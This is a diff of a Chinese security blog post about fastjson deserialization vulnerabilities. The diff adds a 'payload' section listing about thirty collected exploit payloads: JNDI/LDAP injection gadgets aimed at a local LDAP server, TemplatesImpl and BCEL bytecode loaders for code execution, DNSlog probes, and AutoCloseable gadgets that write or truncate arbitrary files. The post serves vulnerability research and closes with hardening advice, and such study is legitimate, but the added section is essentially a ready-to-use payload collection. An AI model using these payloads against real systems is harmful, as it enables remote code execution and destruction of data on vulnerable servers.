@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>fastjson：我一路向北，离开有你的季节 | 素十八</title>
 <meta name="description" content="你救赎的人 终将成为你的光" />
-<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1616663139274">
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1616988203982">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://su18.org/styles/main.css">
@@ -29,7 +29,7 @@
       <div class="main-content">
         <div class="site-header">
   <a href="https://su18.org">
-  <img class="avatar" src="https://su18.org/images/avatar.png?v=1616663139274" alt="">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1616988203982" alt="">
   </a>
   <h1 class="site-title">
     素十八
@@ -101,7 +101,7 @@
                 2021-03-22
               </span>
               <span>
-                25 min read
+                32 min read
               </span>
               
                 <a href="https://su18.org/tag/V0FeVGMWY/" class="post-tag">
@@ -605,7 +605,288 @@ org.springframework
 <figure data-type="image" tabindex="31"><img src="https://su18.org/post-images/1616591945228.png" alt="" loading="lazy"></figure>
 <p>这就形成了 <code>Throwable</code> 子类绕过 <code>checkAutoType()</code> 的方式。我们需要找到 <code>Throwable</code> 的子类，这个类的 getter/setter/static block/constructor 中含有具有威胁的代码逻辑。</p>
 <p>与 <code>Throwable</code> 类似地，还有 <code>AutoCloseable</code> ，之所以使用 <code>AutoCloseable</code> 以及其子类可以绕过 <code>checkAutoType()</code> ，是因为 <code>AutoCloseable</code> 是属于 fastjson 内置的白名单中，其余的调用链一致，流程不再赘述。</p>
-<h1 id="四-总结">四、总结</h1>
+<h1 id="四-payload">四、payload</h1>
+<p>以下为部分在各个途径搜集的 payload，版本自测：</p>
+<p>JdbcRowSetImpl</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+    &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;,
+    &quot;autoCommit&quot;: true
+}
+</code></pre>
+<p>TemplatesImpl</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,
+	&quot;_bytecodes&quot;: [&quot;yv66vgA...k=&quot;],
+	'_name': 'su18',
+	'_tfactory': {},
+	&quot;_outputProperties&quot;: {},
+}
+</code></pre>
+<p>JndiDataSourceFactory</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,
+    &quot;properties&quot;: {
+      &quot;data_source&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+    }
+}
+</code></pre>
+<p>SimpleJndiBeanFactory</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,
+    &quot;targetBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;,
+    &quot;propertyPath&quot;: &quot;su18&quot;,
+    &quot;beanFactory&quot;: {
+      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,
+      &quot;shareableResources&quot;: [
+        &quot;ldap://127.0.0.1:23457/Command8&quot;
+      ]
+    }
+}
+</code></pre>
+<p>DefaultBeanFactoryPointcutAdvisor</p>
+<pre><code class="language-json">{
+  &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;,
+   &quot;beanFactory&quot;: {
+     &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,
+     &quot;shareableResources&quot;: [
+       &quot;ldap://127.0.0.1:23457/Command8&quot;
+     ]
+   },
+   &quot;adviceBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+},
+{
+   &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;
+}
+</code></pre>
+<p>WrapperConnectionPoolDataSource</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,
+    &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced000...6f;&quot;
+  }
+</code></pre>
+<p>JndiRefForwardingDataSource</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,
+    &quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;,
+    &quot;loginTimeout&quot;: 0
+  }
+</code></pre>
+<p>InetAddress</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;java.net.InetAddress&quot;,
+	&quot;val&quot;: &quot;http://dnslog.com&quot;
+}
+</code></pre>
+<p>Inet6Address</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;java.net.Inet6Address&quot;,
+	&quot;val&quot;: &quot;http://dnslog.com&quot;
+}
+</code></pre>
+<p>URL</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;java.net.URL&quot;,
+	&quot;val&quot;: &quot;http://dnslog.com&quot;
+}
+</code></pre>
+<p>JSONObject</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,
+	{
+		&quot;@type&quot;: &quot;java.net.URL&quot;,
+		&quot;val&quot;: &quot;http://dnslog.com&quot;
+	}
+}
+&quot;&quot;
+}
+</code></pre>
+<p>URLReader</p>
+<pre><code class="language-json">{
+	&quot;poc&quot;: {
+		&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+		&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONReader&quot;,
+		&quot;reader&quot;: {
+			&quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,
+			&quot;url&quot;: &quot;http://127.0.0.1:9999&quot;
+		}
+	}
+}
+</code></pre>
+<p>AutoCloseable 任意文件写入</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+	&quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream&quot;,
+	&quot;out&quot;: {
+		&quot;@type&quot;: &quot;java.io.FileOutputStream&quot;,
+		&quot;file&quot;: &quot;/path/to/target&quot;
+	},
+	&quot;parameters&quot;: {
+		&quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipParameters&quot;,
+		&quot;filename&quot;: &quot;filecontent&quot;
+	}
+}
+</code></pre>
+<p>BasicDataSource</p>
+<pre><code class="language-json">{
+  &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,
+  &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A...&quot;,
+  &quot;driverClassLoader&quot; :
+  {
+    &quot;@type&quot;:&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot;
+  }
+}
+</code></pre>
+<p>JndiConverter</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,
+	&quot;AsText&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>JtaTransactionConfig</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,
+	&quot;properties&quot;: {
+		&quot;@type&quot;: &quot;java.util.Properties&quot;,
+		&quot;UserTransaction&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+	}
+}
+</code></pre>
+<p>JndiObjectFactory</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,
+	&quot;resourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>AnterosDBCPConfig</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,
+	&quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>AnterosDBCPConfig2</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,
+	&quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>CacheJndiTmLookup</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,
+	&quot;jndiNames&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>AutoCloseable 清空指定文件</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,
+    &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;,
+    &quot;file&quot;:&quot;/tmp/nonexist&quot;,
+    &quot;append&quot;:false
+}
+</code></pre>
+<p>AutoCloseable 清空指定文件</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,
+    &quot;@type&quot;:&quot;java.io.FileWriter&quot;,
+    &quot;file&quot;:&quot;/tmp/nonexist&quot;,
+    &quot;append&quot;:false
+}
+</code></pre>
+<p>AutoCloseable 任意文件写入</p>
+<pre><code class="language-json">{
+    &quot;stream&quot;:
+    {
+        &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;,
+        &quot;file&quot;:&quot;/tmp/nonexist&quot;,
+        &quot;append&quot;:false
+    },
+    &quot;writer&quot;:
+    {
+        &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;:&quot;org.apache.solr.common.util.FastOutputStream&quot;,
+        &quot;tempBuffer&quot;:&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;,
+        &quot;sink&quot;:
+        {
+            &quot;$ref&quot;:&quot;$.stream&quot;
+        },
+        &quot;start&quot;:38
+    },
+    &quot;close&quot;:
+    {
+        &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;:&quot;org.iq80.snappy.SnappyOutputStream&quot;,
+        &quot;out&quot;:
+        {
+            &quot;$ref&quot;:&quot;$.writer&quot;
+        }
+    }
+}
+</code></pre>
+<p>BasicDataSource</p>
+<pre><code class="language-json">{
+		&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,
+		&quot;driverClassName&quot;: &quot;true&quot;,
+		&quot;driverClassLoader&quot;: {
+			&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
+		},
+		&quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A&quot;
+	}
+</code></pre>
+<p>HikariConfig</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;,
+	&quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>HikariConfig</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;,
+	&quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>HikariConfig</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,
+	&quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>HikariConfig</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,
+	&quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>SessionBeanProvider</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,
+	&quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;,
+	&quot;Object&quot;: &quot;su18&quot;
+}
+</code></pre>
+<p>JMSContentInterceptor</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;,
+	&quot;parameters&quot;: {
+		&quot;@type&quot;: &quot;java.util.Hashtable&quot;,
+		&quot;java.naming.factory.initial&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,
+		&quot;topic-factory&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+	},
+	&quot;namespace&quot;: &quot;&quot;
+}
+</code></pre>
+<p>ContextClassLoaderSwitcher</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.jboss.util.loading.ContextClassLoaderSwitcher&quot;,
+	&quot;contextClassLoader&quot;: {
+		&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
+	},
+	&quot;a&quot;: {
+		&quot;@type&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A&quot;
+	}
+}
+</code></pre>
+<h1 id="五-总结">五、总结</h1>
 <p>通过全篇对 fastjson 诸多版本漏洞的学习和研究，可以发现作者不愿舍弃很多特性，而不停的在对程序的安全检查部分进行“打补丁”一样的漏洞修复手段，这就导致了很多漏洞反反复复的修补和绕过，不仅仅是新的 gadget 被挖掘出来需要 fastjson 不断的更新黑名单，更有很多特性点还是隐藏在程序中等待发现，其实从本文来讲，很多触发点我们只研究了其中的一种，如果肯花时间寻找调用方式，肯定还会有新的发现。</p>
 <p>建议远离 fastjson，或开启 safeMode 关闭 autoTypeSupport 并配置反序列化白名单。</p>
 
@@ -632,7 +913,8 @@ org.springframework
 <li><a href="#8-fastjson-1268">8. fastjson-1.2.68</a></li>
 </ul>
 </li>
-<li><a href="#%E5%9B%9B-%E6%80%BB%E7%BB%93">四、总结</a></li>
+<li><a href="#%E5%9B%9B-payload">四、payload</a></li>
+<li><a href="#%E4%BA%94-%E6%80%BB%E7%BB%93">五、总结</a></li>
 </ul>
 
               </div>
@@ -643,9 +925,9 @@ org.springframework
         
           <div class="next-post">
             <div class="next">下一篇</div>
-            <a href="https://su18.org/post/2020-reading/">
+            <a href="https://su18.org/post/wz3twqDg9/">
               <h3 class="post-title">
-                2020年读书小结
+                RASP究竟该如何防御SSRF
               </h3>
             </a>
           </div>
